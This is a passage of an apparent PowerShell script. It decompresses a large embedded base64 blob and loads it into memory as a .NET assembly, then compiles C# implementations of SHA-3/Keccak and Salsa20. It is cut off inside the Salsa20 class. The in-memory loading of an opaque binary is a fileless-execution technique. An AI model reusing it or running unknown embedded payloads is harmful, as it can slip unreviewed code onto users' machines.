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
'@
$DeflatedStream = New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($EncodedCompressedFile),[IO.Compression.CompressionMode]::Decompress)
$UncompressedFileBytes = New-Object Byte[](563200)
$DeflatedStream.Read($UncompressedFileBytes, 0, 563200) | Out-Null
[Reflection.Assembly]::Load($UncompressedFileBytes) | Out-Null

# Load SHA3 and Salsa20
# Source: https://gist.github.com/FrankSpierings/3577b0365d02df6f7eeb
# Source: https://gist.github.com/FrankSpierings/c18da658e06948313fff
$source = @"
using System;
using System.Diagnostics;
using Org.BouncyCastle.Utilities;

namespace Org.BouncyCastle.Crypto.Digests
{
    /// <summary>
    /// Implementation of Keccak based on following KeccakNISTInterface.c from http://keccak.noekeon.org/
    /// </summary>
    /// <remarks>
    /// Following the naming conventions used in the C source code to enable easy review of the implementation.
    /// </remarks>
    public class KeccakDigest
    {
        private static readonly ulong[] KeccakRoundConstants = KeccakInitializeRoundConstants();

        private static readonly int[] KeccakRhoOffsets = KeccakInitializeRhoOffsets();

        private static ulong[] KeccakInitializeRoundConstants()
        {
            ulong[] keccakRoundConstants = new ulong[24];
            byte LFSRState = 0x01;

            for (int i = 0; i < 24; i++)
            {
                keccakRoundConstants[i] = 0;
                for (int j = 0; j < 7; j++)
                {
                    int bitPosition = (1 << j) - 1;

                    // LFSR86540

                    bool loBit = (LFSRState & 0x01) != 0;
                    if (loBit)
                    {
                        keccakRoundConstants[i] ^= 1UL << bitPosition;
                    }

                    bool hiBit = (LFSRState & 0x80) != 0;
                    LFSRState <<= 1;
                    if (hiBit)
                    {
                        LFSRState ^= 0x71;
                    }

                }
            }

            return keccakRoundConstants;
        }

        private static int[] KeccakInitializeRhoOffsets()
        {
            int[] keccakRhoOffsets = new int[25];
            int x, y, t, newX, newY;

            int rhoOffset = 0;
            keccakRhoOffsets[(((0) % 5) + 5 * ((0) % 5))] = rhoOffset;
            x = 1;
            y = 0;
            for (t = 1; t < 25; t++)
            {
                //rhoOffset = ((t + 1) * (t + 2) / 2) % 64;
                rhoOffset = (rhoOffset + t) & 63;
                keccakRhoOffsets[(((x) % 5) + 5 * ((y) % 5))] = rhoOffset;
                newX = (0 * x + 1 * y) % 5;
                newY = (2 * x + 3 * y) % 5;
                x = newX;
                y = newY;
            }

            return keccakRhoOffsets;
        }

        protected byte[] state = new byte[(1600 / 8)];
        protected byte[] dataQueue = new byte[(1536 / 8)];
        protected int rate;
        protected int bitsInQueue;
        protected int fixedOutputLength;
        protected bool squeezing;
        protected int bitsAvailableForSqueezing;
        protected byte[] chunk;
        protected byte[] oneByte;

        private void ClearDataQueueSection(int off, int len)
        {
            for (int i = off; i != off + len; i++)
            {
                dataQueue[i] = 0;
            }
        }

        public KeccakDigest()
            : this(288)
        {
        }

        public KeccakDigest(int bitLength)
        {
            Init(bitLength);
        }

        public KeccakDigest(KeccakDigest source)
        {
            CopyIn(source);
        }

        private void CopyIn(KeccakDigest source)
        {
            Array.Copy(source.state, 0, this.state, 0, source.state.Length);
            Array.Copy(source.dataQueue, 0, this.dataQueue, 0, source.dataQueue.Length);
            this.rate = source.rate;
            this.bitsInQueue = source.bitsInQueue;
            this.fixedOutputLength = source.fixedOutputLength;
            this.squeezing = source.squeezing;
            this.bitsAvailableForSqueezing = source.bitsAvailableForSqueezing;
            this.chunk = Arrays.Clone(source.chunk);
            this.oneByte = Arrays.Clone(source.oneByte);
        }

        public virtual string AlgorithmName
        {
            get { return "Keccak-" + fixedOutputLength; }
        }

        public virtual int GetDigestSize()
        {
            return fixedOutputLength / 8;
        }

        public virtual void Update(byte input)
        {
            oneByte[0] = input;

            Absorb(oneByte, 0, 8L);
        }

        public virtual void BlockUpdate(byte[] input, int inOff, int len)
        {
            Absorb(input, inOff, len * 8L);
        }

        public virtual int DoFinal(byte[] output, int outOff)
        {
            Squeeze(output, outOff, fixedOutputLength);

            Reset();

            return GetDigestSize();
        }

        /*
         * TODO Possible API change to support partial-byte suffixes.
         */
        protected virtual int DoFinal(byte[] output, int outOff, byte partialByte, int partialBits)
        {
            if (partialBits > 0)
            {
                oneByte[0] = partialByte;
                Absorb(oneByte, 0, partialBits);
            }

            Squeeze(output, outOff, fixedOutputLength);

            Reset();

            return GetDigestSize();
        }

        public virtual void Reset()
        {
            Init(fixedOutputLength);
        }

        /**
         * Return the size of block that the compression function is applied to in bytes.
         *
         * @return internal byte length of a block.
         */
        public virtual int GetByteLength()
        {
            return rate / 8;
        }

        private void Init(int bitLength)
        {
            switch (bitLength)
            {
                case 128:
                    InitSponge(1344, 256);
                    break;
                case 224:
                    InitSponge(1152, 448);
                    break;
                case 256:
                    InitSponge(1088, 512);
                    break;
                case 288:
                    InitSponge(1024, 576);
                    break;
                case 384:
                    InitSponge(832, 768);
                    break;
                case 512:
                    InitSponge(576, 1024);
                    break;
                default:
                    throw new ArgumentException("must be one of 128, 224, 256, 288, 384, or 512.", "bitLength");
            }
        }

        private void InitSponge(int rate, int capacity)
        {
            if (rate + capacity != 1600)
            {
                throw new InvalidOperationException("rate + capacity != 1600");
            }
            if ((rate <= 0) || (rate >= 1600) || ((rate % 64) != 0))
            {
                throw new InvalidOperationException("invalid rate value");
            }

            this.rate = rate;
            // this is never read, need to check to see why we want to save it
            //  this.capacity = capacity;
            this.fixedOutputLength = 0;
            Arrays.Fill(this.state, (byte)0);
            Arrays.Fill(this.dataQueue, (byte)0);
            this.bitsInQueue = 0;
            this.squeezing = false;
            this.bitsAvailableForSqueezing = 0;
            this.fixedOutputLength = capacity / 2;
            this.chunk = new byte[rate / 8];
            this.oneByte = new byte[1];
        }

        private void AbsorbQueue()
        {
            KeccakAbsorb(state, dataQueue, rate / 8);

            bitsInQueue = 0;
        }

        protected virtual void Absorb(byte[] data, int off, long databitlen)
        {
            long i, j, wholeBlocks;

            if ((bitsInQueue % 8) != 0)
            {
                throw new InvalidOperationException("attempt to absorb with odd length queue.");
            }
            if (squeezing)
            {
                throw new InvalidOperationException("attempt to absorb while squeezing.");
            }

            i = 0;
            while (i < databitlen)
            {
                if ((bitsInQueue == 0) && (databitlen >= rate) && (i <= (databitlen - rate)))
                {
                    wholeBlocks = (databitlen - i) / rate;

                    for (j = 0; j < wholeBlocks; j++)
                    {
                        Array.Copy(data, (int)(off + (i / 8) + (j * chunk.Length)), chunk, 0, chunk.Length);

                        KeccakAbsorb(state, chunk, chunk.Length);
                    }

                    i += wholeBlocks * rate;
                }
                else
                {
                    int partialBlock = (int)(databitlen - i);
                    if (partialBlock + bitsInQueue > rate)
                    {
                        partialBlock = rate - bitsInQueue;
                    }
                    int partialByte = partialBlock % 8;
                    partialBlock -= partialByte;
                    Array.Copy(data, off + (int)(i / 8), dataQueue, bitsInQueue / 8, partialBlock / 8);

                    bitsInQueue += partialBlock;
                    i += partialBlock;
                    if (bitsInQueue == rate)
                    {
                        AbsorbQueue();
                    }
                    if (partialByte > 0)
                    {
                        int mask = (1 << partialByte) - 1;
                        dataQueue[bitsInQueue / 8] = (byte)(data[off + ((int)(i / 8))] & mask);
                        bitsInQueue += partialByte;
                        i += partialByte;
                    }
                }
            }
        }

        private void PadAndSwitchToSqueezingPhase()
        {
            if (bitsInQueue + 1 == rate)
            {
                dataQueue[bitsInQueue / 8] |= (byte)(1U << (bitsInQueue % 8));
                AbsorbQueue();
                ClearDataQueueSection(0, rate / 8);
            }
            else
            {
                ClearDataQueueSection((bitsInQueue + 7) / 8, rate / 8 - (bitsInQueue + 7) / 8);
                dataQueue[bitsInQueue / 8] |= (byte)(1U << (bitsInQueue % 8));
            }
            dataQueue[(rate - 1) / 8] |= (byte)(1U << ((rate - 1) % 8));
            AbsorbQueue();

            if (rate == 1024)
            {
                KeccakExtract1024bits(state, dataQueue);
                bitsAvailableForSqueezing = 1024;
            }
            else
            {
                KeccakExtract(state, dataQueue, rate / 64);
                bitsAvailableForSqueezing = rate;
            }

            squeezing = true;
        }

        protected virtual void Squeeze(byte[] output, int offset, long outputLength)
        {
            long i;
            int partialBlock;

            if (!squeezing)
            {
                PadAndSwitchToSqueezingPhase();
            }
            if ((outputLength % 8) != 0)
            {
                throw new InvalidOperationException("outputLength not a multiple of 8");
            }

            i = 0;
            while (i < outputLength)
            {
                if (bitsAvailableForSqueezing == 0)
                {
                    KeccakPermutation(state);

                    if (rate == 1024)
                    {
                        KeccakExtract1024bits(state, dataQueue);
                        bitsAvailableForSqueezing = 1024;
                    }
                    else
                    {
                        KeccakExtract(state, dataQueue, rate / 64);
                        bitsAvailableForSqueezing = rate;
                    }
                }
                partialBlock = bitsAvailableForSqueezing;
                if ((long)partialBlock > outputLength - i)
                {
                    partialBlock = (int)(outputLength - i);
                }

                Array.Copy(dataQueue, (rate - bitsAvailableForSqueezing) / 8, output, offset + (int)(i / 8), partialBlock / 8);
                bitsAvailableForSqueezing -= partialBlock;
                i += partialBlock;
            }
        }

        private static void FromBytesToWords(ulong[] stateAsWords, byte[] state)
        {
            for (int i = 0; i < (1600 / 64); i++)
            {
                stateAsWords[i] = 0;
                int index = i * (64 / 8);
                for (int j = 0; j < (64 / 8); j++)
                {
                    stateAsWords[i] |= ((ulong)state[index + j] & 0xff) << ((8 * j));
                }
            }
        }

        private static void FromWordsToBytes(byte[] state, ulong[] stateAsWords)
        {
            for (int i = 0; i < (1600 / 64); i++)
            {
                int index = i * (64 / 8);
                for (int j = 0; j < (64 / 8); j++)
                {
                    state[index + j] = (byte)(stateAsWords[i] >> (8 * j));
                }
            }
        }

        private void KeccakPermutation(byte[] state)
        {
            ulong[] longState = new ulong[state.Length / 8];

            FromBytesToWords(longState, state);

            KeccakPermutationOnWords(longState);

            FromWordsToBytes(state, longState);
        }

        private void KeccakPermutationAfterXor(byte[] state, byte[] data, int dataLengthInBytes)
        {
            for (int i = 0; i < dataLengthInBytes; i++)
            {
                state[i] ^= data[i];
            }

            KeccakPermutation(state);
        }

        private void KeccakPermutationOnWords(ulong[] state)
        {
            int i;

            for (i = 0; i < 24; i++)
            {
                Theta(state);
                Rho(state);
                Pi(state);
                Chi(state);
                Iota(state, i);
            }
        }

        ulong[] C = new ulong[5];

        private void Theta(ulong[] A)
        {
            for (int x = 0; x < 5; x++)
            {
                C[x] = 0;
                for (int y = 0; y < 5; y++)
                {
                    C[x] ^= A[x + 5 * y];
                }
            }
            for (int x = 0; x < 5; x++)
            {
                ulong dX = ((((C[(x + 1) % 5]) << 1) ^ ((C[(x + 1) % 5]) >> (64 - 1)))) ^ C[(x + 4) % 5];
                for (int y = 0; y < 5; y++)
                {
                    A[x + 5 * y] ^= dX;
                }
            }
        }

        private void Rho(ulong[] A)
        {
            for (int x = 0; x < 5; x++)
            {
                for (int y = 0; y < 5; y++)
                {
                    int index = x + 5 * y;
                    A[index] = ((KeccakRhoOffsets[index] != 0) ? (((A[index]) << KeccakRhoOffsets[index]) ^ ((A[index]) >> (64 - KeccakRhoOffsets[index]))) : A[index]);
                }
            }
        }

        ulong[] tempA = new ulong[25];

        private void Pi(ulong[] A)
        {
            Array.Copy(A, 0, tempA, 0, tempA.Length);

            for (int x = 0; x < 5; x++)
            {
                for (int y = 0; y < 5; y++)
                {
                    A[y + 5 * ((2 * x + 3 * y) % 5)] = tempA[x + 5 * y];
                }
            }
        }

        ulong[] chiC = new ulong[5];

        private void Chi(ulong[] A)
        {
            for (int y = 0; y < 5; y++)
            {
                for (int x = 0; x < 5; x++)
                {
                    chiC[x] = A[x + 5 * y] ^ ((~A[(((x + 1) % 5) + 5 * y)]) & A[(((x + 2) % 5) + 5 * y)]);
                }
                for (int x = 0; x < 5; x++)
                {
                    A[x + 5 * y] = chiC[x];
                }
            }
        }

        private static void Iota(ulong[] A, int indexRound)
        {
            A[(((0) % 5) + 5 * ((0) % 5))] ^= KeccakRoundConstants[indexRound];
        }

        private void KeccakAbsorb(byte[] byteState, byte[] data, int dataInBytes)
        {
            KeccakPermutationAfterXor(byteState, data, dataInBytes);
        }

        private void KeccakExtract1024bits(byte[] byteState, byte[] data)
        {
            Array.Copy(byteState, 0, data, 0, 128);
        }

        private void KeccakExtract(byte[] byteState, byte[] data, int laneCount)
        {
            Array.Copy(byteState, 0, data, 0, laneCount * 8);
        }

        // public virtual IMemoable Copy()
        // {
        //     return new KeccakDigest(this);
        // }

        // public virtual void Reset(IMemoable other)
        // {
        //     KeccakDigest d = (KeccakDigest)other;

        //     CopyIn(d);
        // }
    }
}

namespace Org.BouncyCastle.Crypto.Digests
{
    /// <summary>
    /// Implementation of SHA-3 based on following KeccakNISTInterface.c from http://keccak.noekeon.org/
    /// </summary>
    /// <remarks>
    /// Following the naming conventions used in the C source code to enable easy review of the implementation.
    /// </remarks>
    public class Sha3Digest
        : KeccakDigest
    {
        private static int CheckBitLength(int bitLength)
        {
            switch (bitLength)
            {
            case 224:
            case 256:
            case 384:
            case 512:
                return bitLength;
            default:
                throw new ArgumentException(bitLength + " not supported for SHA-3", "bitLength");
            }
        }

        public Sha3Digest()
            : this(256)
        {
        }

        public Sha3Digest(int bitLength)
            : base(CheckBitLength(bitLength))
        {
        }

        public Sha3Digest(Sha3Digest source)
            : base(source)
        {
        }

        public override string AlgorithmName
        {
            get { return "SHA3-" + fixedOutputLength; }
        }

        public override int DoFinal(byte[] output, int outOff)
        {
            Absorb(new byte[]{ 0x02 }, 0, 2);

            return base.DoFinal(output,  outOff);
        }

        /*
         * TODO Possible API change to support partial-byte suffixes.
         */
        protected override int DoFinal(byte[] output, int outOff, byte partialByte, int partialBits)
        {
            if (partialBits < 0 || partialBits > 7)
                throw new ArgumentException("must be in the range [0,7]", "partialBits");

            int finalInput = (partialByte & ((1 << partialBits) - 1)) | (0x02 << partialBits);
            Debug.Assert(finalInput >= 0);
            int finalBits = partialBits + 2;

            if (finalBits >= 8)
            {
                oneByte[0] = (byte)finalInput;
                Absorb(oneByte, 0, 8);
                finalBits -= 8;
                finalInput >>= 8;
            }

            return base.DoFinal(output, outOff, (byte)finalInput, finalBits);
        }

    }
}

namespace Org.BouncyCastle.Utilities
{
    /// <summary> General array utilities.</summary>
    public abstract class Arrays
    {
        public static byte[] Clone(
            byte[] data)
        {
            return data == null ? null : (byte[])data.Clone();
        }

        public static void Fill(
            byte[]	buf,
            byte	b)
        {
            int i = buf.Length;
            while (i > 0)
            {
                buf[--i] = b;
            }
        }
    }
}

"@
Add-type -TypeDefinition $source -Language CSharp

$source = @"
/*
 * This implementation of Salsa20 is ported from the reference implementation
 * by D. J. Bernstein, which can be found at:
 *   http://cr.yp.to/snuffle/salsa20/ref/salsa20.c
 *
 * This work is hereby released into the Public Domain. To view a copy of the public domain dedication,
 * visit http://creativecommons.org/licenses/publicdomain/ or send a letter to
 * Creative Commons, 171 Second Street, Suite 300, San Francisco, California, 94105, USA.
 */

using System;
using System.Diagnostics;
using System.Security.Cryptography;
using System.Text;

namespace Logos.Utility.Security.Cryptography
{
	/// <summary>
	/// Implements the Salsa20 stream encryption cipher, as defined at http://cr.yp.to/snuffle.html.
	/// </summary>
	/// <remarks>See <a href="http://code.logos.com/blog/2008/06/salsa20_implementation_in_c_1.html">Salsa20 Implementation in C#</a>.</remarks>
	public sealed class Salsa20 : SymmetricAlgorithm
	{
		/// <summary>
		/// Initializes a new instance of the <see cref="Salsa20"/> class.
		/// </summary>
